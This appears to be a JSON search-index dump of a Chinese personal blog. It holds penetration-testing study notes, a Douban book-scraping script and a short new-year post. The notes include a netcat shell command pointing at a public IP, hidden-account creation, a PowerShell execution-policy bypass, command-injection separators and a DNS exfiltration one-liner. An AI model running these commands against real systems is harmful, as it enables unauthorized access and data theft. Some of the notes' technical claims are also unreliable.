arp命令用于显示计算机的ARP缓存表，其中包含与本地计算机通信的其他设备的MAC地址和IP地址的映射关系。 net view: net view命令用于列出网络上可见的计算机和共享资源。 shutdown -s -t 180 -c: 这个命令用于在计算机上执行关机操作。参数-s表示关机，-t表示等待时间（以秒为单位），-c表示添加一条注释/说明。 dir: dir命令用于显示当前目录中的文件和子目录的列表。 cd: cd命令用于更改当前目录。通过提供目录路径，您可以切换到不同的目录。 start www.baidu.com: 这个命令用于在默认浏览器中打开指定的网址。 start 123.txt: 这个命令用于在关联的应用程序中打开指定的文件 copy con c:\\123.txt: 这个命令用于创建一个新文件，并将用户输入的文本内容写入该文件。 hello winglet: 这不是一个命令，而是一个简单的问候语。 ctrl+z: 这不是一个命令，而是在Windows命令提示符中的组合键，用于结束当前正在运行的命令。 md: md命令用于在当前目录中创建一个新的子目录。 rd 123: rd命令用于删除指定的目录。 ren: ren命令用于重命名文件或目录。 del: del命令用于删除文件。 type 123.txt: type命令用于显示文本文件的内容。 net use K:\\\\192.168.80.128\\c$ : 将在本地计算机上创建一个虚拟驱动器（在这个例子中是驱动器K:），它将与远程计算机上的共享文件夹建立连接。磁盘映射，用的是443端口smb协议 补丁安全要300+\nwindows 远程桌面\nnet user: 这个命令用于管理本地用户账户。它可以列出用户账户信息、创建新用户、更改密码等。 net localgroup: 这个命令用于管理本地用户组。它可以列出用户组信息、添加或删除用户组成员等。 隐藏账号: \u0026#34;aa$\u0026#34; 是一个命名约定，当您创建一个以 \u0026#34;$\u0026#34; 结尾的用户账号时，它会被视为隐藏账号，无法在登录屏幕上直接显示。 tasklist: 这个命令用于列出当前正在运行的进程的信息，包括进程ID、进程名称、内存占用等。 taskkill: taskkill命令用于终止或结束正在运行的进程。 tracert: tracert命令用于跟踪数据包从源地址到目标地址经过的路由路径。它可以显示每个路由器的IP地址和跳跃时间。 echo: echo命令用于在命令提示符窗口上显示文本或启用/禁用命令回显。 query user: 这个命令用于显示当前登录到计算机上的用户列表和会话信息。 msg user: 这个命令用于向其他计算机上的用户发送消息。 whoami: whoami命令用于显示当前登录用户的用户名。 hostname: hostname命令用于显示计算机的主机名。 wmic product get name, version: 这个命令使用 Windows Management Instrumentation Command-line (WMIC) 工具，用于列出安装在计算机上的软件产品的名称和版本信息。 netstat -an: netstat命令用于显示网络连接和网络统计信息。通过添加参数\u0026#34;-an\u0026#34;，它会显示所有活动连接的详细信息，包括本地地址、远程地址、连接状态等。 批处理 (.bat) 如果渗透的时候命令出现符号问题，可以尝试把命令放入批处理中，然后运行批处理来防止符号报错。\npowershell 08开始自带\npowershell -exec bypass .\\aa.psl : 启用powershell并执行aa.psl文件 p 分配站：一个大域名为用户分配小域名\n站库分离： 网站和数据库的服务器不同\n对象存储oss:\n相对路径、绝对路径：\n主站、分站、端口站、子站\n常规：url和文件目录对应上\n路由访问：url和文件目录对应不上，需要根据配置路由决定\n文件结构、语言类型\nweb程序源码：开源 商业 自写\n开源-\n前后端分离 原理：前端js框架，api传输数据\n思路：找后端地址，找前端历史漏洞，社工\n1. 前端页面大部分不存在漏洞 2. 后端管理大部分不在同域名 3. 获得权限可能不影响后端 宝塔+phpstudy 原理：打包类集成化环境，权限配置或受控制\n影响：攻击者权限对比区别\n拿到权限后 宝塔： 文件管理 锁定目录 命令执行 无法执行 phpstudy 有权限 docker搭建 思路：docker逃逸\n原理：虚拟化技术独立磁盘空间，非真实物理环境\n攻击者只在虚拟空间磁盘 建站分配站 原理：利用别人的域名模板建立\n影响：实质安全测试非目标资产\n托管 申请（凡科建站） 静态web 例子：大学的html设计网站\n原理：数据没有传输性（js传输不算）\n影响：无漏洞\n伪静态 原理：动态转为静态技术，伪装的静态\n架构 waf 原理：web应用防火墙\n影响：常规web安全测试手段会受拦截\n例子：windows2012 + IIS + d盾\n非嵌入型：硬件型 软件型 云 嵌入型：网站内置的waf cdn 原理： 内容分发服务，旨在提高访问速度\n影响：隐藏真实IP，导致对目标测试错误\n例子：阿里云备案域名全局CDN加速服务\n​\twindows2012 + BT宝塔面板 + CDN服务\noss 原理：云存储服务，提高访问速度\n影响：无法解析，单独存储，但有accesskey隐患\n例子：http://cloudreve.org/\n​\twindows2012 + cloudreve + 阿里云oss\n反向代理 反向代理 为服务器服务\n正向代理 为客户端服务\n原理：通过网络反向代理转发真实服务达到访问目的\n影响：访问目标只是一个代理，非真实应用服务器\n注意：正向和反向代理都是解决访问不可达问题，但反向代理中多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和真实应用毫无关系\n例子：nginx反向代理设置\n负载均衡 原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务加载服务，测试过程中存在多个目标情况\n例子：nginx负载均衡配置\nAPP应用开发架构 原生开发 h5语言开发‘ flutter开发 常规web开发 （网页封装app） 原生态-idea 例子：remusic项目源码 安全影响：反编译+抓包+常规测试 web封装-封装平台 例子：shopXO源码程序+一门app打包 安全影响：常规web安全测试 H5+vue-Hbuilderx 例子：hbuilderx案例 安全影响：api\u0026amp;js框架问题 （前后端分离） wx小程序-web开发-hbuilderx 例子： 判断原生态还是web 1. 文件管理器 2. 看app的功能，ui 常见渗透命令 文件下载命令-解决无图形化\u0026amp;数据传输 **生成命令：**https://forum.ywhack.com/bountytips.php?download\n**linux：**wget curl python tuby perl java等\n**windows：**powershell等\n反弹shell命令 命令生成：https://forum.ywhack.com/\n​\tblackhat插件\n正向连接：\n127.0.0.1 | c:\\\\nc.exe -e -lvnp 5566 ncat 47.122.23.131 5566 反向连接：\n127.0.0.1 | 例子：防火墙绕过-正向连接\u0026amp;反向连接\u0026amp;内网服务器\n管道符\n|\t||\t\u0026amp;\u0026amp;\t\u0026amp;\nwindows：|\t\u0026amp;\t||\t\u0026amp;\u0026amp;\nlinux：；\t| ||\t``\n例子:\tping whoami\n**防火墙 **\n出站规则\n入站规则\n漏洞存在，但不回显\n反弹shell 带外查询 linux： ping whoami.[dnslog网址]\nwindows:\ncmd无法执行whoami 用powershell变量赋值，把whoami执行结果给变量 结果带有\u0026#34;\\\u0026#34;,导致ping无法执行 powershell $x=whoami;$x=$x.Replace(\u0026#39;\\\u0026#39;,\u0026#39;xxx\u0026#39;);$y=\u0026#39;.vpod5d.dnslog.cn\u0026#39;;$z=$x+$y;ping $z ","date":"2024-01-18T17:02:45+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240121_165102.gif","permalink":"https://blog.winglet.com/p/craser%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0%E6%9B%B4%E6%96%B0%E4%B8%AD/","title":"Craser渗透测试笔记[更新中]"},{"content":"简述 ​\t就以我交实验作业的爬虫代码作为2024年的第一篇博客，也作为我更新博客的开端。其实这个爬虫并不是实验要求的，而是我舍友要我写的，因为我们写的是图书管理系统，所以就把爬数据的任务交给我了。如果想要代码可直接翻到最下面。\n思路 要爬取的页面 要爬取的数据格式 存储数据 代码 import re import time import requests import openpyxl findLink = re.compile(r\u0026#39;\u0026lt;a href=\\\u0026#34;https://book.douban.com/subject/(.*?)\\\u0026#34;\u0026#39;) #获取图书的图书的链接 findTitle = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #获取图书的名称 findImgSrc = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;, re.S) #获取图书图片的链接 findDate = re.compile(r\u0026#39;\u0026lt;span class=\u0026#34;pl\u0026#34;\u0026gt;出版年:\u0026lt;/span\u0026gt; (.*?)\u0026lt;br/\u0026gt;\u0026#39;) #图书出版日期 findAuthor = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;book:author\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #图书作者名称 findCode = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;book:isbn\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #图书编码 findDes = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:description\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;, re.S) #图书描述 findPublish = re.compile(r\u0026#39;\u0026lt;span class=\u0026#34;pl\u0026#34;\u0026gt;出版社:\u0026lt;/span\u0026gt;(.*?)\u0026lt;a href=(.*?)\u0026gt;(.*?)\u0026lt;/a\u0026gt;\u0026#39;, re.S) # 图书出版商 #创建一个新的工作簿对象 workbook = openpyxl.Workbook() # 获取默认的工作表 sheet = workbook.active # 写入标题行 sheet.append([\u0026#34;名称\u0026#34;, \u0026#34;描述\u0026#34;, \u0026#34;出版日期\u0026#34;, \u0026#34;作者\u0026#34;, \u0026#34;出版社\u0026#34;, \u0026#34;标准码\u0026#34;, \u0026#34;封面\u0026#34;]) workbook.save(\u0026#34;data.xlsx\u0026#34;) def save(data): sheet.append(data) workbook.save(\u0026#34;data.xlsx\u0026#34;) def askUrl(url): head = { # 模拟浏览器头部信息，向豆瓣服务器发送消息 \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\u0026#34; } html = \u0026#34;\u0026#34; try: resp = requests.get(url, headers=head) html = resp.text print(resp.status_code) except requests.exceptions.RequestException as e: print(\u0026#34;An error occurred\u0026#34;, str(e)) return html def getData(baseurl): count = 0 for i in range(0, 300): url = baseurl + str(i * 20) html = askUrl(url) links = re.findall(findLink, html) for link in list(filter(lambda link: \u0026#34;buylinks\u0026#34; not in link, links)): newurl = \u0026#34;https://book.douban.com/subject/\u0026#34; + link time.sleep(5) html = askUrl(newurl) data = [] try: count += 1 # 书名 title = re.findall(findTitle, html)[0] #图片链接 imgsrc = re.findall(findImgSrc, html)[0] #出版日期 date = re.findall(findDate, html)[0] #图书作者 author = re.findall(findAuthor, html)[0] #出版商 publish = re.findall(findPublish, html)[0][2] #编号 code = re.findall(findCode, html)[0] #描述 decr = re.findall(findDes, html)[0] data.append(title) data.append(decr) data.append(date) data.append(author) data.append(publish) data.append(f\u0026#34;ISBN: {code}\u0026#34;) data.append(imgsrc) save(data) if count == 1000: exit(\u0026#34;爬取完成\u0026#34;) except: continue def main(): baseurl = \u0026#34;https://book.douban.com/tag/经典?type=T\u0026amp;start=\u0026#34; getData(baseurl) if __name__ == \u0026#39;__main__\u0026#39;: main() ​\t运行之后，常常会出现403码，估计还是访问太快导致的，不过当时要求只是一定量的数据即可，所以有些数据没爬到就算了。\n​\t本来想长篇大论的详细说说代码是怎么写的，但里面知识点挺多的，全说的话不知道该怎么讲。还是后面有时间写个基础爬虫的文章算了。\n","date":"2024-01-16T17:48:22+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/2402281848.jpg","permalink":"https://blog.winglet.com/p/%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E4%BF%A1%E6%81%AF/","title":"爬取豆瓣图书信息"},{"content":"ok，我的2024年第一篇博客就此展开，回顾一下我的2023年，这一年里我领到了校赛证书，互联网+证书，认识了一群大佬，并且通过我舍友介绍去挣了大学第一桶金。不过总的来看，这一年还是一个摆烂的一年。不过这两年走过来，我也有了一定的方向，希望2024年我能坚持学习下去。完成2024年的目标。 ","date":"2024-01-15T11:46:02+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/2.jpg","permalink":"https://blog.winglet.com/p/hello-world/","title":"Hello World"}]